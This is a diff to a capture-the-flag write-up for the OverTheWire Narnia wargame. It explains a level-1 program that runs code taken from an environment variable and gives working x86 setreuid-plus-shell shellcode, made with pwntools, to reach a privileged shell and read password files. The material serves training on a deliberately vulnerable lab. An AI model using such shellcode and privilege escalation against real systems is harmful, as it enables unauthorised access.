@@ -46,4 +46,60 @@ ssh -p 2226 narnia0@narnia.labs.overthewire.org bash -c "\"(echo -e 'AAAAAAAAAAA
 
 Now once we type the password of narnia0, `/narnia/narnia0` will send us to a sub-shell and we should be `narnia1` in this new shell.
 
-![Get Shell](assets/narnia0.png)
+To get the password of user `narnia1`, we simply type `cat /etc/narnia_pass/narnia1` and press return.
+
+![Get Shell, narnia0](assets/narnia0.png)
+
+
+## Narnia 1
+
+Now we have the password to log in to `narnia1`, we can find its source code at `/narnia/narnia1.c`.
+
+```c
+#include <stdio.h>
+
+int main(){
+    int (*ret)();
+
+    if(getenv("EGG")==NULL){
+        printf("Give me something to execute at the env-variable EGG\n");
+        exit(1);
+    }
+
+    printf("Trying to execute EGG!\n");
+    ret = getenv("EGG");
+    ret();
+
+    return 0;
+}
+```
+
+`ret` is a function pointer, so once we get the value of the environment variable, `EGG`, it will be assigned to `ret`. 
+
+And calling `ret()` will be effeectively jump to the position of the result of `getenv("EGG")`, it will execute whatever instruction
+we set in the env var `EGG`.
+
+Therefore, we can craft some shellcode and get shell.
+
+```bash
+$ pwn shellcraft -f d setreuid
+\x6a\x31\x58\xcd\x80\x89\xc3\x6a\x46\x58\x89\xd9\xcd\x80
+$ pwn shellcraft -f d sh
+\x6a\x68\x68\x2f\x2f\x2f\x73\x68\x2f\x62\x69\x6e\x89\xe3\x68\x01\x01\x01\x01\x81\x34\x24\x72\x69\x01\x01\x31\xc9\x51\x6a\x04\x59\x01\xe1\x51\x89\xe1\x31\xd2\x6a\x0b\x58\xcd\x80
+```
+
+Or you can use my fork of pwntools which supports multiple shellcraft commands, [cocoa-xu/pwntools:cx-multi-shellcraft-cmd](https://github.com/cocoa-xu/pwntools/tree/cx-multi-shellcraft-cmd).
+
+```bash
+$ pwn shellcraft -f d setreuid + sh
+\x6a\x31\x58\xcd\x80\x89\xc3\x6a\x46\x58\x89\xd9\xcd\x80\x6a\x68\x68\x2f\x2f\x2f\x73\x68\x2f\x62\x69\x6e\x89\xe3\x68\x01\x01\x01\x01\x81\x34\x24\x72\x69\x01\x01\x31\xc9\x51\x6a\x04\x59\x01\xe1\x51\x89\xe1\x31\xd2\x6a\x0b\x58\xcd\x80
+```
+
+So we can do this to get shell and gat the password for user `narnia2`.
+
+```bash
+EGG=`echo -e '\x6a\x31\x58\xcd\x80\x89\xc3\x6a\x46\x58\x89\xd9\xcd\x80\x6a\x68\x68\x2f\x2f\x2f\x73\x68\x2f\x62\x69\x6e\x89\xe3\x68\x01\x01\x01\x01\x81\x34\x24\x72\x69\x01\x01\x31\xc9\x51\x6a\x04\x59\x01\xe1\x51\x89\xe1\x31\xd2\x6a\x0b\x58\xcd\x80'` /narnia/narnia1
+$ cat /etc/narnia_pass/narnia2
+```
+
+![Get Shell, narnia1](assets/narnia1.png)
